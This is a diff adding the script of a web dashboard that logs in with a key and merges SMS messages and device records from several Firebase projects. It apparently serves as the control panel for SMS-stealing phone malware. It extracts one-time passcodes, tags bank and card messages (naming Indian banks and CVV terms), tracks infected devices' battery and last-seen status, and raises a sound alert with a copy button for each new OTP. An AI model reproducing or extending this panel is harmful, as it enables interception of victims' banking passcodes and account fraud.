+    settingsBtn.classList.remove('hidden');
+    boot();
+  } else {
+    loginErr.classList.add('show');
+    keyInput.value = '';
+    keyInput.focus();
+    setTimeout(() => loginErr.classList.remove('show'), 2400);
+  }
+}
+loginBtn.addEventListener('click', attemptLogin);
+keyInput.addEventListener('keydown', e => { if (e.key === 'Enter') attemptLogin(); });
+
+if (stagedConfigs.length > 0 && sessionStorage.getItem('sj_auth') === '1') {
+  loginScreen.classList.add('hidden');
+  app.classList.add('active');
+  settingsBtn.classList.remove('hidden');
+  boot();
+} else if (stagedConfigs.length > 0) {
+  setTimeout(() => keyInput.focus(), 100);
+}
+
+/* ═══════════════════════════════════════
+   FIREBASE MULTI-PROJECT BOOT
+   ═══════════════════════════════════════ */
+let apps = [];       /* [{ id, name, app, db }] */
+let messages = [];
+let devices = [];
+let filter = 'all';
+let search = '';
+let activeTab = 'feed';
+let seenMsgIds = new Set();
+let firstLoad = true;
+
+function boot() {
+  startClock();
+  initFirebase(stagedConfigs);
+  watchAllMessages();
+  watchAllDevices();
+  setInterval(recomputeDevicesStatus, 10_000);
+}
+
+function initFirebase(configs) {
+  apps = configs.map((c, i) => {
+    const appName = 'sj_' + c.id + '_' + i;
+    try {
+      const fbApp = initializeApp(c.config, appName);
+      const db = getDatabase(fbApp);
+      return { id: c.id, name: c.name, app: fbApp, db };
+    } catch (e) {
+      console.error('Firebase init failed for', c.name, e);
+      return null;
+    }
+  }).filter(Boolean);
+
+  document.getElementById('connStatus').textContent =
+    apps.length + ' project' + (apps.length > 1 ? 's' : '') + ' connected';
+}
+
+/* ── CLOCK ── */
+function startClock() {
+  const tick = () => {
+    document.getElementById('clock').textContent =
+      new Date().toTimeString().split(' ')[0];
+  };
+  tick(); setInterval(tick, 1000);
+}
+
+/* ═══════════════════════════════════════
+   MESSAGES — MERGE ALL PROJECTS
+   ═══════════════════════════════════════ */
+function watchAllMessages() {
+  apps.forEach(({ id, name, db }) => {
+    const q = query(ref(db, 'messages'), orderByChild('timestamp'), limitToLast(MAX_FEED));
+    onValue(q, snap => {
+      const arr = [];
+      snap.forEach(child => {
+        const v = child.val();
+        arr.push({
+          id: id + ':' + child.key,
+          project: name,
+          projectId: id,
+          deviceId: v.deviceId || '',
+          sender: v.sender || v.from || 'unknown',
+          body: v.body || v.message || '',
+          otp: v.otp || extractOtp(v.body || v.message || ''),
+          type: v.type || classifyType(v.body || v.message || '', v.sender),
+          timestamp: v.timestamp || Date.now()
+        });
+      });
+
+      /* replace this project's messages */
+      messages = messages.filter(m => m.projectId !== id).concat(arr);
+      messages.sort((a, b) => b.timestamp - a.timestamp);
+
+      /* toast for new */
+      if (!firstLoad) {
+        arr.forEach(m => {
+          if (!seenMsgIds.has(m.id) && m.otp) showOtpToast(m);
+        });
+      }
+      arr.forEach(m => seenMsgIds.add(m.id));
+      firstLoad = false;
+
+      renderFeed();
+      updateStats();
+      document.getElementById('lastSync').textContent =
+        '▸ last sync: ' + new Date().toTimeString().split(' ')[0];
+    }, err => {
+      console.error('messages listen failed for', name, err);
+    });
+  });
+}
+
+/* ═══════════════════════════════════════
+   DEVICES — MERGE ALL PROJECTS
+   ═══════════════════════════════════════ */
+function watchAllDevices() {
+  apps.forEach(({ id, name, db }) => {
+    onValue(ref(db, 'devices'), snap => {
+      const arr = [];
+      snap.forEach(child => {
+        const v = child.val();
+        arr.push({
+          id: id + ':' + child.key,
+          key: child.key,
+          project: name,
+          projectId: id,
+          name: v.name || v.model || child.key,
+          model: v.model || '—',
+          battery: v.battery ?? null,
+          network: v.network || '—',
+          lastSeen: v.lastSeen || 0,
+          status: v.status || 'offline'
+        });
+      });
+      devices = devices.filter(d => d.projectId !== id).concat(arr);
+      recomputeDevicesStatus();
+    }, err => {
+      console.error('devices listen failed for', name, err);
+    });
+  });
+}
+
+function recomputeDevicesStatus() {
+  const now = Date.now();
+  devices.forEach(d => {
+    d._online = d.status === 'online' && (now - d.lastSeen) < OFFLINE_AFTER;
+  });
+  renderDevices();
+  updateStats();
+}
+
+/* ═══════════════════════════════════════
+   HELPERS
+   ═══════════════════════════════════════ */
+function extractOtp(body) {
+  if (!body) return '';
+  const m = body.match(/\b\d{4,8}\b/);
+  return m ? m[0] : '';
+}
+
+function classifyType(body, sender) {
+  const t = (body + ' ' + (sender||'')).toLowerCase();
+  if (/otp|verification|verify/.test(t)) return 'otp';
+  if (/bank|hdfc|icici|sbi|axis|kotak|balance|debited|credited|a\/c/.test(t)) return 'bank';
+  if (/card|visa|master|cvv|expiry|exp/.test(t)) return 'card';
+  return 'sms';
+}
+
+function timeAgo(ts) {
+  const s = Math.floor((Date.now() - ts) / 1000);
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s/60) + 'm ago';
+  if (s < 86400) return Math.floor(s/3600) + 'h ago';
+  return Math.floor(s/86400) + 'd ago';
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+
+/* ═══════════════════════════════════════
+   RENDER FEED
+   ═══════════════════════════════════════ */
+function renderFeed() {
+  const feed = document.getElementById('feed');
+  let items = messages;
+
+  if (filter !== 'all') items = items.filter(m => m.type === filter);
+  if (search) {
+    const q = search.toLowerCase();
+    items = items.filter(m =>
+      m.sender.toLowerCase().includes(q) ||
+      m.body.toLowerCase().includes(q) ||
+      (m.otp && m.otp.includes(q)) ||
+      (m.project && m.project.toLowerCase().includes(q))
+    );
+  }
+
+  if (!items.length) {
+    feed.innerHTML = '<div class="empty brut-static">// no data</div>';
+    return;
+  }
+
+  feed.innerHTML = items.map(m => `
+    <div class="feed-item brut" data-msg="${m.id}">
+      <div class="left">
+        <div class="title">
+          ${escapeHtml(m.sender)}
+          ${apps.length > 1 ? `<span class="project-tag">${escapeHtml(m.project)}</span>` : ''}
+        </div>
+        <div class="body">${escapeHtml(m.body)}</div>
+        <div class="meta">
+          <span>▸ ${timeAgo(m.timestamp)}</span>
+          <span>▸ ${escapeHtml(m.type)}</span>
+          ${m.otp ? `<span style="color:var(--accent)">▸ otp: ${escapeHtml(m.otp)}</span>` : ''}
+        </div>
+      </div>
+      <span class="tag ${m.type === 'bank' ? 'bank' : (m.type === 'otp' ? 'online' : 'offline')}">
+        ${escapeHtml(m.type)}
+      </span>
+    </div>
+  `).join('');
+
+  feed.querySelectorAll('.feed-item').forEach(el => {
+    el.addEventListener('click', () => openMessageModal(el.dataset.msg));
+  });
+}
+
+/* ═══════════════════════════════════════
+   RENDER DEVICES
+   ═══════════════════════════════════════ */
+function renderDevices() {
+  const wrap = document.getElementById('devices');
+  if (!devices.length) {
+    wrap.innerHTML = '<div class="empty brut-static">// no devices reporting</div>';
+    return;
+  }
+  const sorted = [...devices].sort((a,b) => (b._online?1:0) - (a._online?1:0));
+  wrap.innerHTML = sorted.map(d => `
+    <div class="device-card brut">
+      <div class="device-head">
+        <div style="min-width:0;flex:1;">
+          <div class="device-name">
+            ${escapeHtml(d.name)}
+            ${apps.length > 1 ? `<span class="project-tag">${escapeHtml(d.project)}</span>` : ''}
+          </div>
+          <div class="device-model">${escapeHtml(d.model)}</div>
+        </div>
+        <span class="tag ${d._online ? 'online' : 'offline'}">
+          ${d._online ? 'online' : 'offline'}
+        </span>
+      </div>
+      <div class="device-meta">
+        <span>▸ battery: ${d.battery ?? '—'}${d.battery!=null?'%':''}</span>
+        <span>▸ net: ${escapeHtml(String(d.network))}</span>
+        <span>▸ seen: ${timeAgo(d.lastSeen)}</span>
+      </div>
+    </div>
+  `).join('');
+}
+
+function updateStats() {
+  const online  = devices.filter(d => d._online).length;
+  const offline = devices.length - online;
+  const today0  = new Date(); today0.setHours(0,0,0,0);
+  const otps    = messages.filter(m => m.timestamp >= today0.getTime() && m.otp).length;
+
+  document.getElementById('statTotal').textContent   = messages.length;
+  document.getElementById('statOnline').textContent  = online;
+  document.getElementById('statOffline').textContent = offline;
+  document.getElementById('statOtp').textContent     = otps;
+}
+
+/* ═══════════════════════════════════════
+   SEARCH + FILTER
+   ═══════════════════════════════════════ */
+const searchInput = document.getElementById('searchInput');
+const searchClear = document.getElementById('searchClear');
+
+searchInput.addEventListener('input', e => {
+  search = e.target.value.trim();
+  searchClear.classList.toggle('show', search.length > 0);
+  renderFeed();
+});
+searchClear.addEventListener('click', () => {
+  searchInput.value = ''; search = '';
+  searchClear.classList.remove('show'); renderFeed();
+});
+
+document.querySelectorAll('.filter-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    filter = btn.dataset.filter;
+    renderFeed();
+  });
+});
+
+document.querySelectorAll('.tab').forEach(t => {
+  t.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    t.classList.add('active');
+    activeTab = t.dataset.tab;
+    document.getElementById('feedTab').style.display    = activeTab === 'feed'    ? '' : 'none';
+    document.getElementById('devicesTab').style.display = activeTab === 'devices' ? '' : 'none';
+  });
+});
+
+/* ═══════════════════════════════════════
+   MODAL
+   ═══════════════════════════════════════ */
+const modalBg   = document.getElementById('modalBg');
+const modalTtl  = document.getElementById('modalTitle');
+const modalSub  = document.getElementById('modalSub');
+const modalBody = document.getElementById('modalBody');
+const modalClose= document.getElementById('modalClose');
+
+function openMessageModal(id) {
+  const m = messages.find(x => x.id === id);
+  if (!m) return;
+  modalTtl.textContent = m.sender;
+  modalSub.textContent = `▸ ${new Date(m.timestamp).toLocaleString()} ▸ ${m.type} ▸ ${m.project}`;
+
+  modalBody.innerHTML = `
+    ${m.otp ? `
+      <div class="modal-field">
+        <div class="modal-label">▸ Otp</div>
+        <div class="otp-box">
+          <div class="modal-value">${escapeHtml(m.otp)}</div>
+          <button class="copy-btn" id="copyOtp" data-otp="${escapeHtml(m.otp)}">Copy</button>
+        </div>
+      </div>
+    ` : ''}
+    <div class="modal-field">
+      <div class="modal-label">▸ Full Message</div>
+      <div class="modal-value">${escapeHtml(m.body)}</div>
+    </div>
+    <div class="modal-field">
+      <div class="modal-label">▸ Device Id</div>
+      <div class="modal-value">${escapeHtml(m.deviceId || '—')}</div>
+    </div>
+    <div class="modal-field">
+      <div class="modal-label">▸ Project</div>
+      <div class="modal-value">${escapeHtml(m.project)}</div>
+    </div>
+  `;
+
+  const copyBtn = document.getElementById('copyOtp');
+  if (copyBtn) {
+    copyBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(copyBtn.dataset.otp).then(() => {
+        copyBtn.textContent = '✓ Copied';
+        setTimeout(() => copyBtn.textContent = 'Copy', 1400);
+      });
+    });
+  }
+
+  modalBg.classList.add('show');
+}
+modalClose.addEventListener('click', () => modalBg.classList.remove('show'));
+modalBg.addEventListener('click', e => { if (e.target === modalBg) modalBg.classList.remove('show'); });
+
+/* ═══════════════════════════════════════
+   OTP TOAST
+   ═══════════════════════════════════════ */
+function showOtpToast(m) {
+  const box = document.getElementById('toasts');
+  const el = document.createElement('div');
+  el.className = 'toast';
+  el.innerHTML = `
+    <div class="toast-head">
+      <span class="toast-title">▸ New Otp</span>
+      <span class="toast-time">${timeAgo(m.timestamp)}</span>
+    </div>
+    <div class="toast-otp">${escapeHtml(m.otp)}</div>
+    <div class="toast-body">${escapeHtml(m.sender)} — ${escapeHtml(m.body)}</div>
+  `;
+  box.appendChild(el);
+
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = ctx.createOscillator();
+    const g = ctx.createGain();
+    o.connect(g); g.connect(ctx.destination);
+    o.type = 'sine';
+    o.frequency.setValueAtTime(880, ctx.currentTime);
+    o.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.08);
+    g.gain.setValueAtTime(0.15, ctx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
+    o.start(); o.stop(ctx.currentTime + 0.3);
+  } catch (_) {}
+
+  setTimeout(() => {
+    el.classList.add('out');
+    setTimeout(() => el.remove(), 320);
+  }, 8000);
+}
+</script>
+</body>
+</html>
